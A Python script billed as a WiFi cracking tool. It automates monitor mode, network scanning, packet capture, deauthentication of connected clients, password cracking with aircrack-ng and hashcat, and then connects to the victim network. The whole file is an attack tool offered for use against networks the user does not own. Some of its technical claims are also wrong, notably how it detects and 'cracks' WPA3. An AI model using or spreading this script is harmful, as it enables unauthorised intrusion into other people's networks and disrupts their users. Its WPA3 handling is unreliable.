#!/usr/bin/env python3

# NiiX key - WiFi Cracking Script
# Created by: cuteLiLi / techniix
# Version: b1.61

import subprocess
from collections import namedtuple
import os
import time
import platform
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Elt

# Define a named tuple to store network information
Network = namedtuple('Network', ['ssid', 'bssid', 'channel', 'signal'])

def get_os():
    """Detect the operating system."""
    system = platform.system()
    
    if system == "Linux":
        return "Linux"
    else:
        return "Unknown"

def install_dependencies(os_type):
    """Install necessary dependencies based on the operating system."""
    try:
        print(f"Installing necessary dependencies for {os_type}...")
        
        if os_type == "Linux":
            subprocess.run(['sudo', 'apt-get', 'update'], check=True)
            subprocess.run([
                'sudo', 'apt-get', 'install', '-y',
                'aircrack-ng', 'reaver', 'python3-scapy', 'python3-pip',
                'hashcat', 'wpa_supplicant', 'wget'
            ], check=True)
        
        print("Dependencies installed successfully.")
    except Exception as e:
        print(f"Error installing dependencies: {e}")
        exit(1)

def get_interfaces():
    """Get available wireless interfaces."""
    try:
        output = subprocess.check_output(['iwconfig']).decode('utf-8')
        lines = output.splitlines()
        interfaces = []
        for line in lines:
            if 'IEEE 802.11' in line:
                interface = line.split()[0]
                interfaces.append(interface)
        return interfaces
    except Exception as e:
        print(f"Error getting interfaces: {e}")
        exit(1)

def get_networks(interface):
    """Scan for available WiFi networks and return them sorted by signal strength."""
    try:
        print(f"Scanning networks on interface {interface}...")
        networks = []
        interface_mon = interface + 'mon'
        subprocess.run(['airmon-ng', 'start', interface], check=True)
        
        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                ssid = pkt[Dot11Elt].info.decode('utf-8')
                bssid = pkt[Dot11].addr2
                channel = ord(pkt.notdecoded[-4:-3])
                signal = int(ord(pkt.notdecoded[-2:-1]) - 256)
                networks.append(Network(ssid=ssid, bssid=bssid, channel=channel, signal=signal))
        
        sniff(iface=interface_mon, prn=packet_handler, timeout=30)
        subprocess.run(['airmon-ng', 'stop', interface_mon], check=True)
        
        return sorted(networks, key=lambda n: n.signal, reverse=True)

    except Exception as e:
        print(f"Error scanning networks: {e}")
        return []

def display_menu(networks):
    """Display a numbered menu of available networks."""
    print("Available WiFi Networks (sorted by signal strength):")
    for i, network in enumerate(networks, 1):
        print(f"{i}. {network.ssid} ({network.bssid}, Channel: {network.channel})")
    choice = input("Enter the number of the network you want to crack: ")
    return int(choice) - 1

def capture_packets(interface_mon, bssid, channel):
    """Capture packets from the selected network."""
    try:
        subprocess.run(['airmon-ng', 'start', interface_mon], check=True)
        subprocess.Popen([
            'airodump-ng', '--bssid', bssid, '--channel', str(channel), '-w', 'capture', interface_mon
        ])
    except Exception as e:
        print(f"Error capturing packets: {e}")

def deauthenticate_clients(interface_mon, bssid):
    """Deauthenticate clients connected to the target network."""
    try:
        subprocess.run(['aireplay-ng', '--deauth', '10', '-a', bssid, interface_mon], check=True)
    except Exception as e:
        print(f"Error deauthenticating clients: {e}")

def crack_wpa2(bssid, capture_file):
    """Attempt to crack the WPA2 password using aircrack-ng."""
    try:
        output = subprocess.check_output(['aircrack-ng', '-a', '2', '-b', bssid, capture_file + '.cap']).decode('utf-8')
        if "KEY FOUND!" in output:
            key = [line for line in output.splitlines() if "KEY FOUND!" in line][0].split()[3]
            print(f"Password cracked: {key}")
            return key
        else:
            print("Failed to crack the password.")
            return None
    except Exception as e:
        print(f"Error cracking WPA2: {e}")
        return None

def detect_wifi_type(bssid):
    """Detect WiFi type (WPA2 or WPA3) using reaver."""
    try:
        output = subprocess.check_output(['reaver', '-i', 'wlan0mon', '-b', bssid, '--no-associate', '-c', '1']).decode('utf-8')
        if "WPA Version 2" in output:
            return "WPA2"
        elif "WPA Version 3" in output:
            return "WPA3"
    except Exception as e:
        print(f"Error detecting WiFi type: {e}")
        return None

def crack_wpa3(bssid, capture_file):
    """Attempt to crack the WPA3 password using hashcat."""
    try:
        # Extract the PMKID from the captured packets
        subprocess.run(['aircrack-ng', '-j', 'pmkid.hccapx', capture_file + '.cap'], check=True)
        
        # Download additional wordlists if they don't exist
        wordlist_dir = 'wordlists'
        os.makedirs(wordlist_dir, exist_ok=True)
        wordlists = [
            'https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10-million-password-list-top-100.txt',
            'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.gz'
        ]
        
        for wordlist_url in wordlists:
            wordlist_path = os.path.join(wordlist_dir, os.path.basename(wordlist_url))
            if not os.path.exists(wordlist_path):
                subprocess.run(['wget', '-O', wordlist_path, wordlist_url], check=True)
        
        # Unzip rockyou.txt.gz
        subprocess.run(['gunzip', wordlist_path], check=True)
        
        # Crack the PMKID using hashcat
        hashcat_command = f"hashcat -m 16800 pmkid.hccapx {os.path.join(wordlist_dir, 'rockyou.txt')}"
        subprocess.run(hashcat_command, shell=True, check=True)
    except Exception as e:
        print(f"Error cracking WPA3: {e}")

def connect_to_network(ssid, key):
    """Connect to the WiFi network."""
    try:
        subprocess.run(['nmcli', 'device', 'wifi', 'connect', ssid, 'password', key], check=True)
        print("Connected successfully!")
    except Exception as e:
        print(f"Error connecting to network: {e}")

def main():
    os_type = get_os()
    
    if os_type != "Linux":
        print("This script only works on Linux.")
        exit(1)
    
    install_dependencies(os_type)
    
    interfaces = get_interfaces()
    if not interfaces:
        print("No wireless interfaces found.")
        exit(1)
    
    print("Available interfaces:")
    for i, interface in enumerate(interfaces, 1):
        print(f"{i}. {interface}")
    
    choice = int(input("Enter the number of the interface to use: ")) - 1
    selected_interface = interfaces[choice]
    
    networks = get_networks(selected_interface)
    if not networks:
        print("No networks found.")
        exit(1)
    
    network_choice = display_menu(networks)
    selected_network = networks[network_choice]
    
    interface_mon = selected_interface + 'mon'
    subprocess.run(['airmon-ng', 'start', selected_interface], check=True)
    
    capture_packets(interface_mon, selected_network.bssid, selected_network.channel)
    
    # Wait for packet capture to start
    time.sleep(5)
    
    deauthenticate_clients(interface_mon, selected_network.bssid)
    
    # Wait for packet capture to complete
    time.sleep(30)
    
    if detect_wifi_type(selected_network.bssid) == "WPA2":
        key = crack_wpa2(selected_network.bssid, 'capture')
    elif detect_wifi_type(selected_network.bssid) == "WPA3":
        crack_wpa3(selected_network.bssid, 'capture')
        key = input("Enter the WPA3 password found: ")
    else:
        print("Unknown WiFi type.")
        exit(1)
    
    if not key:
        print("Password cracking failed.")
        exit(1)
    
    connect_to_network(selected_network.ssid, key)

if __name__ == "__main__":
    main()
